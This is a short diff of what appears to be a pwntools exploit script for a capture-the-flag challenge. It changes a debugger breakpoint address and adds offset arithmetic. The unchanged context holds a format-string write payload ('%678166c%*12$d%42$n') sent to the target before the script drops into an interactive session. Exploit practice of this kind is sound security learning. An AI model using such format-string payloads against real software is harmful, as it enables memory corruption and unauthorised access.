@@ -25,7 +25,7 @@ def start(argv=[], *a, **kw):
         return process([exe.path] + argv, *a, **kw)
 
 gdbscript = '''
-pie break 0x000000000000126e
+pie break 0x000000000000124a
 c
 '''.format(**locals())
 
@@ -46,3 +46,6 @@ ru("leek? ")
 sl("%678166c%*12$d%42$n")
 # sl("a")
 i()
+
+0x14949 - 0x5000
+0xffff+1
